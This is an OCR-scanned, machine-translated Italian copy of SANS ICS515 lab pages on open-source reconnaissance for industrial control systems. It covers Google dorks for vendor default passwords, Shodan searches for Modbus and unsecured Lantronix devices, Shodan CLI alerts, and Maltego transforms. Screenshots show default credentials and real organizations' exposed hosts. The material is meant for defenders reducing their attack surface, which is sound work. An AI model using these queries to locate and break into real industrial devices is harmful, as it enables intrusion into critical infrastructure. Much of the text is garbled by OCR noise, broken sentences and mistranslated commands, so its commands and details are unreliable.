supportare la presenza di malware, la mancanza di malware, una minaccia interna, un amministratore incapace e qualsiasi altro
numero di ipotesi. È importante sapere che gli honeypot possono aiutare a supportare le conclusioni e che ACH è un
potente strumento con cui gli analisti dovrebbero acquisire familiarità. In definitiva, il consumo di informazioni sulle minacce
il personale a volte dovrà esprimere giudizi di analisi tra prove concorrenti (come ad esempio
Il monitoraggio della sicurezza della rete non rileva una minaccia, ma la sensazione percepita dagli utenti legati alla manipolazione delle minacce e dell'ambiente
fortemente che ciò sia possibile). Ciò non è dovuto al loro ruolo in nessuno di questi processi, ma alla loro capacità di farlo
fornire prospettive imparziali con forti capacità di analisi.

© 2021, Roberto M.Lee Lab 1.2-5
wo w Ww

wv noi wo uw w

Py

noi © oO WwW ww Y

VY

Obiettivi: tempo minimo di laboratorio ~ 35 minuti

e __ Familiarizzazione con Shodan e Google Hacking Queries
e Identificare le informazioni sulla propria organizzazione

*Informazioni sullo scenario* Nel contesto degli scenari dal giorno 1 al giorno 4, i partecipanti assumono il ruolo di una minaccia
analista dell'intelligence per identificare il tipo di informazioni disponibili pubblicamente sulla propria organizzazione. Questo
L'esercizio dimostrerà il tipo di informazioni a disposizione di un avversario. Queste informazioni potrebbero essere utilizzate da
difensori a ridurre la superficie di attacco delle informazioni o a introdurre nuove tecniche di monitoraggio sui vulnerabili
informazioni e superfici. ICS410 ha insegnato i fondamenti dello Shodan, ma questo esercizio dovrebbe essere utilizzato
prova query di ricerca più avanzate e concentrati in particolare su ciò che un utente malintenzionato utilizzerebbe contro di te.

Preparazione agli esercizi

Questo esercizio utilizzerà una connessione Internet e un browser sul tuo computer (si consiglia di utilizzare il tuo
computer host anziché una VM poiché la VM Windows è impostata per utilizzare la rete locale con bridge e noi no
ho ancora esaminato le impostazioni di rete all'interno della VM RELICS).

Compito: Familiarizzazione con Shodan e Google Hacking Queries

*Nota* Cercheremo alcuni tipi di dati che gli aggressori potrebbero cercare. I principali fornitori di ICS lo sono
verrà utilizzato come esempio, ma non c'è nulla di intrinsecamente negativo nell'informazione e non è un
vulnerabilità. Tuttavia, questo è il tipo di informazioni a cui gli avversari potrebbero essere interessati. Tutti i fornitori ICS
e la maggior parte delle organizzazioni dispone di informazioni simili disponibili online.

> Sul tuo computer, apri un browser web di tua scelta che disponga di una connessione Internet attiva

> Dovresti avere un account Shodan dal Lab 0
*Nota* Ora esploreremo alcune query di Google per mostrare con quale tipo di informazioni è possibile raccogliere
loro.

> Vai su Google.com

*Nota* Google consente di utilizzare gli operatori per personalizzare le opzioni di ricerca. Di seguito ne proveremo alcuni. Per una buona lista (il
il collegamento fa distinzione tra maiuscole e minuscole) vedere: https://www.sans.org/security-resources/GoogleCheatSheet.pdf

*Nota* La procedura dettagliata seguente è ciò che è stato restituito quando l'autore del corso ha eseguito i comandi.
A causa della natura delle informazioni open source, le query potrebbero non restituire più gli stessi risultati. Utilizzo
le informazioni seguenti sono un esempio di ciò che dovresti fare, ma se ottieni informazioni diverse conservale
procedere.

© 2021, Robert M. Lee Lab 1.3-1
> Cerca le password predefinite nei dispositivi ICS di un fornitore di tua scelta
> Ad es. Nella barra di Google cercare: “password predefinita” inurl:siemens filetype:pdf
o "inurl" garantisce che il termine di ricerca sia nell'URL restituito nella ricerca. Citazioni
intorno alle parole assicurati che tutte le parole all'interno della citazione siano presenti e in quell'ordine. Tipo di file
designa un tipo di file per i file restituiti come PDF, Doc e PPT.

Vai gle "password predefinita" inurl:siemens filetype:pdf 'ke

> Identificare documenti interessanti che potrebbero essere utili per gli avversari
> Ad es. La ricerca sopra riportata restituisce documenti per sistemi come ad es. SIMATIC HMI WinCC

POFIReadme - Supporto online di Siemens Industry —
support.automation.siemens.com/dnl/zy/zY 1MZMZAAAA.../ReadMe. pdf+
Per lo Sm@rtServer e per il Web server integrato la password di default è “100°

Per impostazione predefinita, per l'“Amministratore” è impostata la password utente "400".

> – Identificare le informazioni di valore nel documento
> Ad es. Ctrl-F fa apparire la barra di ricerca in cui puoi digitare la tua ricerca, ad esempio "password predefinita"

| password predefinita — Totalmente
}
Informazioni sulla sicurezza |
T
|
Funzionamento sicuro di un impianto |
Per garantire il funzionamento sicuro di un impianto è necessario adottare anche misure di sicurezza adeguate
includere la sicurezza informatica (e.9. segmentazione della rete). Ulteriori informazioni sulla sicurezza industriale sono disponibili
disponibile in Internet (www.siemens.com/industrialsecurity). |
In WinCC sono preimpostate diverse password. Per motivi di sicurezza, dovresti cambiare
queste password. |
* Per lo Sm@riServer e per il Web server integrato la password di default è "100" I
© La password utente "100" è impostata di default per l'“Amministratore”. |
ss

> Prova un'altra ricerca per gli annunci a cui gli aggressori potrebbero essere interessati
> Ad es. Cerca: “contratto aggiudicato” “scada’” tipo file:doc
o Gli avversari spesso cercano di trarre vantaggio dai cambiamenti nelle infrastrutture e dall'aggiunta di appaltatori
in loco o annunci di nuovi sistemi di interesse per guidare gli obiettivi di sfruttamento

Vai O gle “contratto aggiudicato” tipo file "scada":doc u a) |

> Identificare documenti interessanti e le informazioni che presentano gli avversari
> Ad es. Il primo documento restituito quando è stata avviata questa ricerca riguarda un sistema SCADA Invesys
e ampliamento di un impianto a gas

© 2021, Robert M. Lee Lab 1.3-2

ee® & @® oe.

@
vouvuvuvewvewsewwseweweteew

oe wT wT Ww

0 Le informazioni sono state oscurate per la privacy degli individui e del sito, ma questo
informazioni stampa del tutto accettabili possono essere utilizzate per identificare i siti in espansione e
può rappresentare un avversario un buon bersaglio.Ancora più importante, forniscono nomi di siti, e-mail
indirizzi e altri tipi di informazioni che possono essere utilizzati per eseguire query successive o
prendere di mira persone specifiche con e-mail di spear phishing.

o L'annuncio visualizzato è del 2006. Google consente di modificare l'intervallo temporale
in "Strumenti di ricerca" per impostare un intervallo personalizzato, ad esempio cercare solo informazioni recenti
indicizzato dal motore di ricerca.

invensySe

informazioni stampa

Invensys implementerà il sistema SCADA per major
espansione dell'impianto gas S98 negli Emirati Arabi Uniti

Nuovo monitoraggio e controllo digitale, soluzioni HMI e servizi di supporto
espansione del progetto Onshore Gas Development Phase ili (OGD-ill).

> — Ritorna a Shodan ed effettua l'accesso

> Cerca i dispositivi di interesse connessi a Internet e indicizzati da Shodan
> Ad es. Nella barra di ricerca, cerca: modbus port:502 country:us
o Shodan ha filtri avanzati molto simili a Google

% SHODAN Esplora Download Prezzi e porta modbus:502 paese:us| io

> - Fare clic sull'indirizzo IP di un dispositivo interessante
> Ad es. Il primo dispositivo restituito è stato cliccato e visualizzato di seguito

o Shodan registra le sue ricerche ma tieni presente che tutte queste sono state eseguite in precedenza: le tue ricerche
non incoraggiare più attività da parte di Shodan (cioè ciò che è noto è già noto e tu lo fai
non influenzarlo)

o Molte informazioni vengono indicizzate come l'indirizzo IP, la posizione, il tipo di dispositivo e persino
informazioni restituite dal dispositivo quando è stato interagito come mostrato di seguito
(le informazioni identificative sono state oscurate)

come i & è ip ws |

“ap

© 2021, Robert M. Lee Lab 1.3-3
Profilo dell'ospite:
ne Stati Uniti
Latitudine Longitudine

ID unità: 255
identificazione: Modbus/TCP to RTU Bridge Bridge V3.3.25.0RC$

-- Dispositivo I

| Nessuno | Bridge da Modbus TCP a RTU

Versione software V'3.3.25.0RCS (140113)

Premere Invio per la modalità di configurazione

*Nota* Una parte significativa di Shodan è basata sull'accaparramento di banner. Ciò significa che quando un dispositivo ha un file
banner quando interagisci con esso, come un server GE CIMPLICITY che ha "CIMPLICITY-HttpSvr/1.0" nel suo
banner, puoi cercare il banner in Shodan. Ciò consente query più personalizzate e non limita la
interazione semplicemente con protocolli o nomi di fornitori.

> Esegui query più avanzate per trovare risorse che vanno oltre i semplici nomi di fornitori o protocolli
> Query di esempio (Credito: “Quantitatively Assessing and Visualizing Industrial
documento di tesi System Attack Surfaces):
io. CIMPLICITY-HttpSvr/1.0
ii. WindRiver-WebServer/4.4
iii. Modicon+M340+CPU

© 2021, Robert M. Lee Lab 1.3-4

=

oo 2o~,

Py fF ff 2 ff ff 2 2 2 2

?

 ]
ov sposato dbuoewktiwutbwwswwsw

era così ww

eo noi wh

*Nota* Puoi combinare i termini di ricerca con i campi che potrebbero apparire nel banner, come "password".
Inoltre, puoi utilizzare "-" per rimuovere parole o "+" per assicurarti che una parola sia presente. Ad esempio, Internet-
I dispositivi Lantronix collegati (gateway da seriale a Ethernet) vengono visualizzati come "protetto" in Shodan quando la password
non viene trasmesso dal dispositivo.

> Effettuare una ricerca dei dispositivi Lantronix non sicuri
> Digita quanto segue nella barra di ricerca Shodan:
password lantronix: protetta

fantronix protetto da password Q Esplora Download Report Enterprise

* Sfrutta % Maps © '® Condividi Ricerca. :

‘

@% SHODAN

| st Scarica risultati | lul Crea rapporto

PAESI TOP

_ oe a 173.26

sì; _ Lantronix
, Cavo FG Mediacom: _
», gre re . 5.2 _— - Password: soos
@ Stati Uniti, Theodore

Dettagli

Stati Uniti, esa2 165.123

grido Lantronix

Canada 1.300 iversi i

Università di Penneyivania: Password: ALD1
Ungheria 358 ae bet ancora "*

. SE degli Stati Uniti, Filadelfia

Repubblica Ceca 182 ;

Dettagli
Belgio 151

> Esegui ricerche sulla tua infrastruttura o organizzazione per rivelare problemi che potrebbero essere necessari
essere affrontati dopo la lezione. Filtri di esempio che potrebbero essere utili:

Città: ricerca dispositivi in ​​una città specifica (Es. Città Simatic: Washington DC)

Paese: cerca i dispositivi in ​​un paese specifico (Es. CIMPLICITY country:US)

Net: cerca dispositivi in ​​uno specifico intervallo IP o CIDR (ad esempio Modbus net:210.10.10.0/24)

Porta: cerca dispositivi con porte specifiche aperte (Es. Porta Modbus:502)

Geo: ricerca di dispositivi su coordinate geografiche specifiche (ad esempio EthernetIP geo:50.2222, -50.2222)

Dopo/Prima: ricerca dispositivi in ​​un intervallo temporale (Es. Modbus after:1/01/2016)

VVVVVV

*Nota* È possibile combinare insieme i filtri di ricerca per ricerche complesse.

[Attività: salva la chiave API

In alto a destra, fai clic sul pulsante “Account”.
Copia la chiave API associata al tuo account
Salva la chiave API in un documento sul desktop per utilizzarla in un lab successivo

Inoltre, salva l'indirizzo IP di un dispositivo ICS interessante visualizzato in una delle tue query per
utilizzare in un laboratorio successivo

VVV WV

© 2021, Robert M. Lee Lab 1.3-5
Esercizio da asporto:

Anche le organizzazioni che praticano pratiche di sicurezza leader del settore pubblicano informazioni su se stesse.
Annunci di prodotti, personale da contattare, posizioni geografiche, ecc. sono tutte informazioni comunemente
disponibile.Alcune organizzazioni trovano anche la necessità di fornire informazioni come password predefinite e
guide alla risoluzione dei problemi per garantire che i loro clienti siano in grado di accedere rapidamente e facilmente ai sistemi importanti.
Queste informazioni, non importa quanto innocenti, sono tutte preziose per gli avversari. La maggior parte delle informazioni non può esserlo
eliminati, ma le organizzazioni dovrebbero essere consapevoli del tipo di informazioni che stanno diffondendo e ridurle
dove possibile. I dispositivi ICS connessi a Internet, tuttavia, non sono incoraggiati. Risorse ICS direttamente collegate a
Internet o quelli che compaiono su Shodan hanno molte probabilità di essere presi di mira con successo. Sapere come fare
passare dalle ricerche Google alle ricerche Shodan per identificare le risorse disponibili per la tua organizzazione è importante
per la sicurezza e un maggiore monitoraggio e consapevolezza. Shodan ha anche un nuovo sottoinsieme del suo sito web che
rivela una mappa degli ICS connessi a Internet. Il sito Web presenta anche tutti i dati associati nella parte inferiore del file
pagina per il download e l'esame. Le organizzazioni dovrebbero assicurarsi che i loro sistemi non siano su questa mappa o in
i dati: https://icsmap.shodan.io

© 2021, Robert M. Lee Lab 1.3-6

awww

wi

www ww ww

noi noi Ww

ooh ww

oe@®

)

a Ss GG ws

Laboratorio 1.4 - Maltego e Shodan ICS Heatmarp

e Crea una mappa termica ICS in Maltego con Shodan

*Informazioni sullo scenario* Questo esercizio è un esempio di ciò che un analista dovrebbe fare per mantenersi aggiornato
con il loro spazio di attacco alle informazioni ICS utilizzando dati disponibili al pubblico. È un esercizio che chiunque valuta ICS
L'infrastruttura dovrebbe essere molto conosciuta poiché le risorse ICS connesse a Internet sono tra le più diffuse
problemi del settore oggi.

Questo esercizio utilizzerà la VM SANS ICS RELICS. In questo laboratorio verificherai le impostazioni di rete della VM e
garantire la connettività attraverso entrambe le interfacce di rete configurate nella VM.

Attività: convalida le impostazioni di rete della VM RELICS = --

> Avvia VMWare Player
> Selezionare la VM RELICS e quindi modificare le impostazioni della macchina virtuale

> Assicurati che l'adattatore di rete VM sia in modalità Bridged e seleziona l'opzione "configura adattatori".
selezionare l'adattatore di rete corretto

> Se richiesto, selezionare Sì nel prompt dell'UAC

Questo prodotto VMware richiede l'amministratore
"privilegio. Se si fa clic su Annulla, l'applicazione

avrà funzionalità limitate.

Editore verificato: VMware, Inc.
Origine del file: disco rigido su questo computer

Mostra più dettagli

> Deseleziona tutte le interfacce, tranne l'interfaccia ASIX

> Al termine, selezionare OK

© 2021, Robert M. Lee Lab 1.4-1
Opzioni hardware

Riepilogo dispositivo Stato del dispositivo.
Memoria S846B | Collegato
) Processori 2 | connettersi all'accensione

100GB

Rileva automaticamente la connessione di rete
Bridged (automatico) @Bridged: connesso direttamente alla rete fisica

NAT
Presente
Rilevamento automatico | "Configura adattatori".

(Stato della connessione di rete fisica Ci Repticate

CJbisplay Rilevamento automatico | OvNaT: utilizzato per condividere l'indirizzo IP dell'host
con l'ospite

Impostazioni bridging automatico x |

| Seleziona gli adattatori di rete host che desideri utilizzare automaticamente f
| ponte:

| MAASIK Ax88179 Adattatore da USB 3.0 a Gigabit Ethernet
(I Adattatore virtuale Microsoft Wi-Fi Direct n. 2

| C) Adattatore virtuale Wi-Fi Direct Microsoft f
| Cointeice) Wi-Fi 6ax201 160mHz

(Ci intei(r) connessione ethernet (10) 1219-LM
[(Adattatore JTaP-Windows vo

[J Dispositivo siuetooth (Personal Area Network)

Segmenti LAN... Avanzate...

OK Annulla Aiuto

> Dovresti anche vedere un secondo "Scheda di rete 2" con una configurazione NAT. Queste reti
gli adattatori sono configurati in modo da consentire la comunicazione tramite l'adattatore di rete con bridge
l'interfaccia di rete fisica sull'host al PLC e alla VM Windows. La seconda rete
l'adattatore è configurato come NAT per consentire alla VM RELICS di comunicare anche con Internet
l'adattatore wireless host.

*Nota: le impostazioni di rete della VM per il corso richiederanno una connessione di rete fisica dall'host
la workstation al PLC e le macchine virtuali saranno entrambe impostate in modalità bridge per utilizzare un fisico comune
connessione dall'host. Se richiesto quando si collega l'adattatore da USB a Ethernet, farlo sempre
connettersi all'host. Modifichiamo anche le impostazioni di connessione del bridge per garantire che la VM non tenti di utilizzare a
adattatore diverso quando si tenta di comunicare con il PLC.

*Nota* I passaggi per aggiungere e configurare l'adattatore USB al tuo host e impostare il bridging delle VM varieranno se lo sei
utilizzando VM Workstation Professional o VM Fusion. I passaggi forniti in questo lab sono specifici di VM Player.

> — Avviare la VM RELICS ICS515, se viene richiesto di scaricare gli strumenti VM selezionare "ricordamelo più tardi"

> Accedi alla VM
> LOGIN=reliquie
> PASSWORD = reliquie

> Nella finestra del terminale RELICS che si apre all'accesso, testare un ping al PLC locale su 192.168.0.10 e
in caso di successo premere CNTRL + C per interrompere il ping e quindi testare un ping su un sito esterno come
www.google.com

© 2021, Robert M. Lee Lab 1.4-2
terminale fl

Ping S$ 1

PING 192.
byte da 1
byte da 192.
byte da 192.

92.168.
ets trasmessi,
rtt min/medio/max/mdev = 0

statisti
perdita di pacchetti, tempo 2017ms
877/1.069/0.182 ms

S$ ping www.google.com
«google.com (
da slc09s01-in-f4.1e

217.15.2

8) 56(84) byte di dati.
et (172. icmp_seq=1 ttl=128

5s da slc09s01-in-f4.1e100.net (172,2 ttl=128 timeg

> Se i ping falliscono, verificare che l'adattatore da USB a Ethernet sia collegato all'host, non alla VM guest e
verificare le impostazioni di rete nella VM descritte sopra.

[Attività ~ Genera avvisi per le nuove risorse ICS che appaiono in Shodan

*Nota* Semplicemente non c'è abbastanza tempo durante la giornata per eseguire regolarmente ricerche di dispositivi connessi a Internet,
ma è estremamente importante. Pertanto, è fondamentale imparare a generare avvisi in base ai nuovi dispositivi
apparendo nello Shodan. Di seguito verranno mostrati i passaggi per familiarizzare con la riga di comando Shodan
interfaccia e generazione di avvisi. Alla fine verrà fornita una raccomandazione per automatizzare questo processo
compito.

> Sulla tua VM RELICS, utilizza la finestra Terminale aperta
> Esegui il collegamento Terminale sul desktop, se necessario

> Visualizza le opzioni dell'interfaccia a riga di comando (CLI) di Shodan
> Inserisci il seguente comando nel Terminale:
shodan -h

vovvovoowvvoewveuoewebwbesewseuew”

w

vv Vv wow ww

> Annotare i comandi che possono essere immessi

© 2021, Robert M. Lee

Laboratorio 1.4-3
[OPZIONI

ahi, questo m

Yen inserisci il le di dati in a
Restituisce il numero di risultati di una ricerca
Dati in blocco ac odan
UN :
scaricamento
minerale

lo Shodan
indirizzo IP esterno
l'anizzazione è ac

eults a
utilizzando Shodan.

Fornire informazioni di riepilogo per la query sull'arco
Trasmetti i dati in tempo reale
versione Stampa la versione di questo strumento.

Inserisci la tua chiave API nella CLI di Shodan in modo da poter raggiungere l'API di Shodan
> Ottieni la tua chiave API, che può essere trovata in "Account" su shodan.io, e avrebbe dovuto essere così
salvato in un file sul desktop dopo aver eseguito il lab precedente

> Inserisci il seguente comando nel Terminale, sostituendo APIKEY con la tua chiave tramite copia/incolla:

shodan init APIKEY

Panoramica dell'Account

Libero professionista a livello di account

Chiave API aac aria)

RR aaa era

*Nota* Dovresti esplorare i vari comandi Shodan nella CLI Shodan ad un certo punto dopo il laboratorio. Qui,
ne proveremo uno. Shodan CLI ha accesso all'API Streaming, il che significa che ottieni i dati non appena ritornano direttamente
Shodan invece di quanto indicizzato in precedenza. Ciò significa che non ottieni tante informazioni, ma le ottieni
le informazioni più recenti.

> Doa Conteggio degli asset con la parola modbus nei loro banner

> Inserisci il seguente comando nel Terminale:
shodan conteggio modbus

© 2021, Robert M. Lee Lab 1.4-4

@, ae, oe, @, m=, oe,

Roy
vu vo wb wow Ww wwe & WW

Co noi Ww Ww

oe F€@ GG Uw WG Ww

S$ shodan conteggio modbus

396

*Nota* È importante essere in grado di scavare più a fondo nel set di dati rispetto a un semplice conteggio per convalidare ciò che trovi
e assicurati che sia rilevante per te. Tuttavia, i conteggi possono rappresentare un'ottima prima occhiata ai dati, soprattutto per
prevedere volumi elevati.

> Cercare i dispositivi che hanno la parola “modbus” in un campo indicizzabile
> Inserisci il seguente comando nel Terminale
shodan search --fields ip_str,porta,org,nomihost,tipodispositivo,titolo,html Modbus
> Premere "q" per uscire

§ ricerca shodan --fields ip_str,porta,org,nomihost,tipodispositivo,titolo,html Modbus

*Nota* L'output restituisce le informazioni che Shodan utilizza per creare i dati visualizzati nella GUI Shodan su
sito web. Nella CLI, non solo puoi accedere ai dati grezzi ma anche selezionare i campi che desideri invece
gciting tutti i dati. Ciò aiuta a esaminare i dati più velocemente e in modo più semplice. Gli argomenti impostati
includere l'indirizzo IP del dispositivo, il numero di porta su cui è stato visualizzato il banner, l'organizzazione a cui è assegnato,
nomi host del dispositivo ed eventuali titoli o banner html restituiti. Non tutte le informazioni devono essere presenti. COME
ad esempio, di seguito sono riportate alcune risorse restituite che non hanno nomi host.

*Nota* Puoi anche cercare i filtri che hai utilizzato nella GUI Shodan, incluse porte specifiche come mostrato di seguito.

vicetipo, titolo, porta html:502

*Nota* Ora che hai compreso la CLI e le informazioni presenti al suo interno, puoi creare
avvisi. Gli avvisi ti consentono di cercare informazioni non appena arrivano in Shodan. Non cercherà ciò che è stato
precedentemente indicizzati in Shodan, ma ti avvisano invece di nuove informazioni che corrispondono alla tua query. Questo è uno dei
i modi migliori per essere consapevoli di quali dispositivi ICS esterni e risorse informative vengono visualizzati
Shodan. Dovresti utilizzare queste informazioni per prestare particolare attenzione a tali dispositivi fino a quando non potranno essere rimossi
da Internet.

> Familiarizza con i comandi Shodan Alert
> Inserisci il seguente comando nel Terminale
avviso shodan

© 2021, Robert M. Lee Lab1.4-5
avviso shodan
sage: shodan alert [OPZIONI] COMANDO [ARGS]...

Gestisci gli avvisi di rete per il tuo account

Opzioni:
-h, --help Mostra questo messaggio ed esce.comandi:
cancella Rimuovi tutti gli avvisi

create Crea un avviso di rete per monitorare una rete esterna

disabilita Disabilita un trigger per l'avviso

abilita Abilita un trigger per l'avviso

info Mostra informazioni su un avviso specifico
Elenco Elenca tutti gli avvisi attivi

rimuovi Rimuove l'avviso specificato

trigger Elenca i trigger di notifica disponibili

> Creare un avviso di base per dimostrare le capacità della funzione di avviso
> Inserisci il seguente comando nel Terminale:
shodan alert crea “Test” 8.8.8.0/32

$ shodan alert crea "Test" 8.8.8.0/32

*Nota* Qui abbiamo creato un avviso e gli abbiamo dato il nome "Test". L'intervallo IP scelto è l'intervallo DNS di Google.
Tuttavia, lo strumento non è pensato per monitorare intervalli più ampi senza interagire con John Matherly, lo strumento
fondatore. Gli studenti SANS ICS515 hanno accesso extra all'API e allo strumento per scopi didattici. Normalmente, utilizzando l'API

in questo modo è intesa come una funzionalità premium.

© 2021, Robert M. Lee

Laboratorio 1.4-6

@ @ @

@
ouvweveuwsvewsewswetebsetseusoeee

dobbiamo

oe ww Ww

ew ww a

a5

Compito: crea una mappa termica ICS in Maltego con Shodan

*Nota* Maltego è un ottimo strumento per visualizzare set di dati e arricchirli con dati open source. L'apertura-
i dati di origine sono resi disponibili in "Trasformazioni" che è simile a un'API e a un set di dati. Shodan ha trasformazioni
per Maltego, il che rende la combinazione di strumenti estremamente utile. Alcune delle trasformazioni sono aperte e libere
disponibili (come Shodan) e alcune trasformazioni sono disponibili da strumenti e database a pagamento.

1. Nella tua VM RELICS, avvia Maltego
> Esegui l'icona Maltego nel vassoio inferiore

*Nota* Se non viene visualizzato dopo averlo avviato, controlla la barra degli strumenti in alto e seleziona
applicazione avviata; a volte inizia a minimizzare

B+@mRHs @ && Maltego

Selezione del prodotto

Scegli come desideri utilizzare Maitego:

Maltego One è la nuova soluzione unificata per accedere e attivare i piani Maltego
Professionisti e Imprese,

Maitego eXtra Large è la soluzione premium di Paterva per visualizzare grandi set di dati e
consente più di 10.000 entità in un unico grafico.

Maltego CE (gratuito) tn Maltego CE (Community Edition) verranno installate le trasformazioni della community e
può essere eseguito per generare grafici, ma le funzionalità sono limitate e il risultato
i grafici non possono essere utilizzati per scopi commerciali,

2. Completare l'installazione guidata
> Fai clic su Avanti e ti verrà chiesto di accedere
io. Se non disponi di un login Maltego, fai semplicemente clic su "registrati qui" ed effettua un login
account da utilizzare per questa classe; i conti sono gratuiti
> Fare clic su Avanti nelle schermate rimanenti, lasciando selezionate le opzioni predefinite
» Al termine della Configurazione guidata; l'ultima schermata presenterà un'opzione per "Vai via, ho finito".
Questo prima”; fare clic su quell'opzione e fare clic su Continua per uscire dal popup

3. Installare la trasformazione Shodan

> Nella pagina principale dell'applicazione è presente il Transform Hub; scorrere verso il basso per identificare il
"Shodan", selezionalo, fai clic su "Installa" e poi su "Sì" per visualizzare il popup e inserisci la chiave API

© 2021, Robert M. Lee Lab 1.4-7
Hub di trasformazione Maltego

Edizione comunitaria - N

Approfondisci i dati di interconnessione globale utilizzando
PeeringDB.

Pipl
di Maltego Technologies

Contatta support@maltege.com per ottenere l'accesso a
questo elemento dell'Hub. Velocizzare le indagini e combattere...

Shodan
di Maltego Technologies

Shodan è il primo motore di ricerca al mondo per
Dispositivi connessi a Internet. Interrogazione toT globale.

Collegamenti sociali CE

*Nota* Quando hai finito, vedrai la schermata qui sotto o una simile ad essa notando numerose novità

[RICARICARE]

65 elementi dell'hub in totale | 1 elemento dell'hub

Interroga peoplemon.com

Polonioso
*di Polonious Systems

Indagine e caso altamente configurabili
piattaforma di gestione

Rompisilo
di Silobreaker

L'intelligence sulle minacce si trasforma da Silobreaker.

SocialNet

[AGGIORNAMENTO]

trasforma)

Utilizza PhoneSearch per verificare i numeri di telefono,
fornendo nomi reali, indirizzi, social...

D_ Registrato Future Inc.
*i® di Recorded Future Inc.

Interroga Recorded Future per informazioni sulle minacce
informazione

Collegamenti sociali PRO
dai collegamenti sociali

Metodi essenziali per l'intelligenza e
indagini.

[_S8L_] Trasformazioni del certificato SSL

sono state installate le trasformazioni. Al momento della creazione di questo lab erano disponibili cinque nuove trasformazioni.

© 2021, Robert M. Lee

Laboratorio 1.4-8

0

oO, mm, @,

=,

@, @) UN, @, @,

@,
veouvuwdeuvwsoebseuoewewbewoew”

ew Ww

wwe noi noi WF GF WH

4B

4.

Installa Shodan

Completare

Sono stati aggiunti/aggiornati:

1 server delle applicazioni
69 Trasformazioni

21 Entità

1 Icone

10 set di trasformazione

Apri una nuova mappa
> Clicca sull'icona Maltego nell'angolo in alto a sinistra
> Seleziona "Nuovo" dal menu a discesa

> Verrà visualizzato un popup per l'esecuzione di macchine specifiche; basta uscire da questa finestra nell'angolo in alto a destra

© 2021, Robert M. Lee

Laboratorio 1.4-9
Comunità Maltego|

5.Posiziona una risorsa IPv4 sulla mappa
> Nel riquadro di sinistra “Palette” selezionare “infrastruttura” per espandere la finestra
> Trascina e rilascia "Indirizzo IPv4" sulla mappa

Equazione della comunità di Maltego

It o, Claer Grach'| segaiolo di Recuite | Modalità Privacy su i
Bis cioè a

TB 96 tagliato _aeameweRON '

Copia Incolla athe fai] Normale YW | ohick Trova

1 t
Elimina Sia itis esse | Trova file

Nuovo grafico (1)

CIDR del blocco di rete

ef
CVE

Nome DNS

Dominio

Indirizzo IPv4

Indirizzo IPv6

\

74.207.243.85
modo

*Nota* Qui puoi monitorare interi netblock, domini e altre risorse. È consigliabile per questa visione
per monitorare il netblock della tua organizzazione. Questo sarà un modo rapido per visualizzare ciò di cui Shodan è a conoscenza
dell'organizzazione, comprese le risorse ICS connesse a Internet.

© 2021, Robert M. Lee Lab 1.4-10
wo ws ww © ww wo noi noi noi noi noi

nt

Se wee we ww ws WW

usp

*Nota* Qui dovrai inserire le informazioni della tua organizzazione. Tuttavia, dovresti inserire un indirizzo IP di an
risorsa interessante che hai trovato in Shodan.io nel lab precedente.

6. Cambia la risorsa IPv4 in una risorsa ICS che hai trovato in Shodan
> Fare doppio clic sulla risorsa sulla mappa per modificarne l'IP
> Inserisci l'IP nella finestra popup e esci dalla finestra (non è necessaria alcuna opzione di salvataggio)

7. Avviare una query sulla risorsa
> Fare clic con il pulsante destro del mouse sulla risorsa
> Seleziona l'icona della doppia freccia accanto a "Shodan" (sembra un pulsante di avanzamento veloce) e seleziona Esegui
se richiesto.

+ Tutte le trasformazioni »
+ Trasformazioni standard CE
+ Shodan x»

XXIHX OES

a a a ca lai ae

ojsuesl

*Nota* Il database Shodan viene ora interrogato con informazioni relative a quell'indirizzo IP.

*Nota* Le informazioni restituite verranno tracciate evidenziando in particolare i banner visualizzati nelle diverse porte accessibili
su quell'indirizzo IP. Di seguito vengono restituiti l'ASN, la posizione GPS, il DNS e il banner FTP. Nel banner FTP, aveva
la parola Modbus.

eens
ohm
<&¢
wTTP/2.0 203 Red MEDORA mb Oh, Hemme Deskvos _, CVE-20IS-0708 con ntebe2a?
engi heme tah
‘x € @B 9
é noi =.
agned JACKSON ENERGY AUTHORITY JACKSON ENERGY AUTHORITY 35 614S2,-B8 81255 53435 Jackson, Stati Uniti Sa pial WTA tah
Provami
ee su di noi
semis senans bagnato “one
un ioso Senta Se
Innclanomieiseareiie. tee Lsmcea-_Faemaesh cA
© 2021, Robert M. Lee Lab 1.4-11
*Nota* Se volessimo vedere di più, potremmo fare clic sull'icona e poi su "..." nella scheda Visualizzazione proprietà.

8081 - Stendardo di servizio

| Reindirizzamento HTTP/1.0 302
| Server: CIMPLICITY-HttpSvr/1.0

Data: giovedì 08 luglio 2021 07:04:48 GMT
| Posizione: http://d46fl8c1/index. html

Etichetta

¢

GOL 1fOfe- 267

-~e@e

"S

1.1 206Va bene

Desktop remoto PF... CVE-2019-0708

Hash della bandiera.

#

“vede9403

Hash della bandiera

3303 43 1622804862

AL Hash

ry

Noi

362218 “ goBt 443 3383

4a256 Firew sono CA web

I Firew sono CA web

Seriale del certificato

HeBee3474d22c83e. 1520353643,

proprietà dinamiche
= da

un io

— Informazioni sul grafico

*Nota* Sentiti libero di eseguire trasformazioni aggiuntive sulla risorsa e su qualsiasi cosa restituita. Gran parte di ciò che viene restituito
OSINT attraverso altre trasformazioni deve essere valutato con molta attenzione perché può essere errato come è la natura
dell'OSINT. Altre trasformazioni possono aiutare a identificare quali informazioni sono pubblicamente note, comprese le scansioni pubbliche
vulnerabilità, informazioni sulla proprietà del dominio e altro ancora. Al termine, chiudi Maltego e Scarta
i cambiamenti.

Esercizi da asporto: ;

Gli analisti dovrebbero essere sempre consapevoli di ciò che è pubblicamente disponibile sui loro asset. Informazioni pubbliche spesso
necessita di molte analisi automatizzate e umane per renderlo utile. Tuttavia, con la conoscenza del tuo
infrastruttura e organizzazione, come l'intervallo IP che stai utilizzando, puoi creare avvisi molto utili in Shodan
per essere avvisato quando le informazioni sulle tue risorse appaiono online. Puoi inoltre visualizzarne uno molto più ricco
insieme di dati dal database Shodan per essere informato su ciò che gli avversari possono scoprire su di te online.
Disporre di queste informazioni è la chiave per ridurre lo spazio di attacco alle informazioni ed eliminare percorsi di accesso facili
nella tua organizzazione da parte degli avversari.

© 2021, Robert M. Lee Lab 1.4-12

oh

eh

7.ff} * @® ®
ouvevveueseuuewbeuwsweewwewwes www

ahi w&

ao Ww

Questo esercizio utilizzerà la macchina virtuale Windows e il kit SANS ICS515 Student. Per la risoluzione dei problemi fare riferimento a
I passaggi dell'esercizio 1.1 (inclusa la modifica dell'IP nell'intervallo 169.254.x.x/16, se necessario).

Lab 2.1- Funzionamento del processo

Caricare la logica operativa nel PLC

Connettiti e visualizza i settori operativi tramite un HMI

Comprendere le dipendenze dei processi, il normale funzionamento del sistema, le operazioni di emergenza e gli errori
modalità

